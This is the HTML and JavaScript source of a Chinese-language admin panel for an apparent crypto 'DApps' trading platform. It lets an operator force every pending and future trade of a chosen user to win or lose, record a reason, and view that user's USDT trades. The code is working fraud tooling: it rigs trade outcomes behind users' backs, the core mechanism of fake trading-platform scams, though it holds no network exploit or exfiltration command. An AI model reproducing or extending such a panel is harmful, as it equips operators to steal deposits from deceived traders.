<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>交易控制 | DApps 管理后台</title><style>:root{font-family:Inter,"Microsoft YaHei",system-ui,sans-serif;color:#eef3ff;background:#090d16}*{box-sizing:border-box}body{margin:0;background:#090d16}.top{display:flex;justify-content:space-between;align-items:center;padding:18px 24px;border-bottom:1px solid #1f2a40;background:#0b111b}.brand{font-size:22px;font-weight:800}.muted{color:#8fa0bc}.main{padding:24px;max-width:1500px;margin:auto}.panel{background:#101725;border:1px solid #202c43;border-radius:16px;padding:18px;margin-bottom:16px}.bar,.actions{display:flex;gap:10px;align-items:center;flex-wrap:wrap}.bar{justify-content:space-between}.btn,input{font:inherit}.btn{border:0;border-radius:9px;padding:9px 12px;font-weight:700;cursor:pointer}.ghost{background:#182236;color:#dbe5f7}.auto{background:#1d2942;color:#b9ccff}.win{background:#143726;color:#84e7af}.loss{background:#3a1920;color:#ffabb8}.search{background:#0b111d;border:1px solid #283651;color:#fff;border-radius:10px;padding:10px 12px;width:min(340px,100%)}table{width:100%;border-collapse:collapse;margin-top:14px;font-size:13px}th,td{text-align:left;padding:13px 10px;border-bottom:1px solid #1d2940}th{color:#8fa0bc}.id{font-size:14px;color:#fff}.badge{display:inline-flex;padding:5px 9px;border-radius:999px;background:#172239}.detail{display:none}.detail.open{display:block}.login{min-height:100vh;display:grid;place-items:center}.login-card{width:400px;max-width:92%;padding:24px;background:#101725;border:1px solid #25314a;border-radius:18px}.login-card input{width:100%;margin:7px 0 12px;background:#0b111d;border:1px solid #283651;color:#fff;padding:11px;border-radius:9px}@media(max-width:900px){.main{padding:14px}.table-wrap{overflow:auto}}</style></head><body><section id="login" class="login" style="display:none"><div class="login-card"><b class="brand">DApps 管理后台</b><p class="muted">管理员登录</p><input id="email" placeholder="管理员邮箱"><input id="password" type="password" placeholder="密码"><button id="loginBtn" class="btn ghost" style="width:100%">登录</button></div></section><section id="app" style="display:none"><header class="top"><div><div class="brand">交易控制</div><div class="muted">按用户账户统一管理交易结果规则</div></div><div class="actions"><button class="btn ghost" onclick="location.href='/'">管理首页</button><button id="logout" class="btn ghost">退出</button></div></header><main class="main"><section class="panel"><div class="bar"><div><b>用户交易控制</b><div class="muted">直接显示用户 ID。设置后应用于该用户当前全部待结算交易，并作为该用户后续新交易的默认控制规则。</div></div><div class="actions"><input id="search" class="search" placeholder="搜索用户ID / 姓名 / 登录账号"><button id="refresh" class="btn ghost">刷新</button></div></div><div class="table-wrap"><table><thead><tr><th>用户ID</th><th>用户</th><th>全部交易</th><th>待结算</th><th>当前控制</th><th>控制该用户全部交易</th><th>查看交易</th></tr></thead><tbody id="users"></tbody></table></div></section><section id="detail" class="panel detail"><div class="bar"><div><b id="detailTitle">用户交易明细</b><div class="muted">该账户的全部交易记录</div></div><button class="btn ghost" onclick="document.querySelector('#detail').classList.remove('open')">关闭</button></div><div class="table-wrap"><table><thead><tr><th>交易单</th><th>交易对</th><th>方向</th><th>金额</th><th>时长</th><th>控制</th><th>结果</th><th>到期</th></tr></thead><tbody id="trades"></tbody></table></div></section></main></section><script>const $=s=>document.querySelector(s),esc=s=>String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[c])),zh={auto:'自动',win:'赢',loss:'输',pending:'待结算',won:'赢',lost:'输',up:'看涨',down:'看跌'},dt=v=>v?new Date(v).toLocaleString('zh-CN',{hour12:false}):'—';async function raw(p,o={}){const r=await fetch(p,{headers:{'content-type':'application/json'},...o}),d=await r.json().catch(()=>({}));return{r,d}}async function api(p,o={}){const{r,d}=await raw('/admin-api'+p,o);if(r.status===401){showLogin();throw Error('登录已过期')}if(!r.ok)throw Error(d.error||'请求失败');return d}function showLogin(){$('#login').style.display='grid';$('#app').style.display='none'}function showApp(){$('#login').style.display='none';$('#app').style.display='block';loadUsers()}async function loadUsers(){try{const q=$('#search').value.trim(),d=await api('/trade-users'+(q?'?search='+encodeURIComponent(q):''));$('#users').innerHTML=d.users.map(u=>`<tr><td><b class="id">${esc(u.publicId)}</b></td><td>${esc(u.displayName)}<br><span class="muted">${esc(u.identifier)}</span></td><td>${u.tradeCount}</td><td>${u.pendingCount}</td><td><span class="badge">${esc(zh[u.resultControl]||u.resultControl)}</span>${u.note?`<br><span class="muted">${esc(u.note)}</span>`:''}</td><td><div class="actions"><button class="btn auto" onclick="setUser('${esc(u.publicId)}','auto')">自动</button><button class="btn win" onclick="setUser('${esc(u.publicId)}','win')">全部赢</button><button class="btn loss" onclick="setUser('${esc(u.publicId)}','loss')">全部输</button></div></td><td><button class="btn ghost" onclick="openTrades('${esc(u.publicId)}')">全部交易</button></td></tr>`).join('')||'<tr><td colspan="7" class="muted">暂无用户</td></tr>'}catch(e){alert(e.message)}}window.setUser=async(id,c)=>{let note='';if(c!=='auto'){note=prompt(`请输入将用户 ${id} 的交易控制设为“${zh[c]}”的原因：`)||'';if(!note.trim())return}if(!confirm(`确认将用户 ${id} 的全部交易控制设为“${zh[c]}”吗？`))return;try{await api('/trade-users/'+encodeURIComponent(id)+'/control',{method:'PATCH',body:JSON.stringify({control:c,note})});loadUsers();if($('#detail').classList.contains('open'))openTrades(id)}catch(e){alert(e.message)}};window.openTrades=async id=>{try{const d=await api('/trades?search='+encodeURIComponent(id));$('#detailTitle').textContent=id+' · 全部交易';$('#trades').innerHTML=d.trades.map(t=>`<tr><td><b>${esc(t.tradeNo)}</b><br><span class="muted">${dt(t.openedAt)}</span></td><td>${esc(t.symbol)}</td><td>${esc(zh[t.direction]||t.direction)}</td><td>${Number(t.amount).toLocaleString()} USDT</td><td>${t.duration}秒</td><td>${esc(zh[t.resultControl]||t.resultControl)}</td><td>${esc(zh[t.result]||t.result)}</td><td>${dt(t.expiresAt)}</td></tr>`).join('')||'<tr><td colspan="8" class="muted">暂无交易</td></tr>';$('#detail').classList.add('open');$('#detail').scrollIntoView({behavior:'smooth'})}catch(e){alert(e.message)}};$('#refresh').onclick=loadUsers;let timer;$('#search').oninput=()=>{clearTimeout(timer);timer=setTimeout(loadUsers,250)};$('#loginBtn').onclick=async()=>{const{r,d}=await raw('/session/login',{method:'POST',body:JSON.stringify({email:$('#email').value,password:$('#password').value})});if(r.ok)showApp();else alert(d.error||'登录失败')};$('#logout').onclick=async()=>{await fetch('/session/logout',{method:'POST'});showLogin()};(async()=>{const{r}=await raw('/session/me');r.ok?showApp():showLogin()})();</script></body></html>
